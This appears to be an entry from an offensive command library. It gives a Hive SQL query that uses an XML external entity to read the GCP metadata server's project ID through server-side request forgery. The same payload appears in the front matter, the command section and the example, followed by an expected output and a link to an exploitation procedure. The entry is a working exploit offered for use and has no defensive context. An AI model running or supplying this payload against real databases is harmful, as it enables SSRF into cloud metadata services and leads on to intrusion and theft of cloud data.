---
data: >-
  select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [
  <!ENTITY xxe SYSTEM
  "http://metadata.google.internal/computeMetadata/v1beta1/project/project-id">
  ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
tags:
  - xxe
  - ssrf
type: command
executor: sql
platforms:
  - GCP
id: 6407c335-e86b-4b81-b33c-9bcfe712feb4
created_at: '2025-12-13T09:00:27.759Z'
updated_at: '2025-12-13T09:00:27.759Z'
verified: false
validated: true
submitted: true
---
# select-xpath-string-project-id

## Command

```sql
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/project-id"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```

## Description

Executes XXE injection to fetch GCP project ID via SSRF in Hive database.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `SYSTEM` | Fetches from specified URI | Yes |
| `xpath_string` | Processes XML with XXE | Yes |

## Examples

### Basic Usage

```sql
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/project-id"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```

## Expected Output

"en-development"

## Related

- [[procedures/Exploit-XXE-for-GCP-Metadata]]
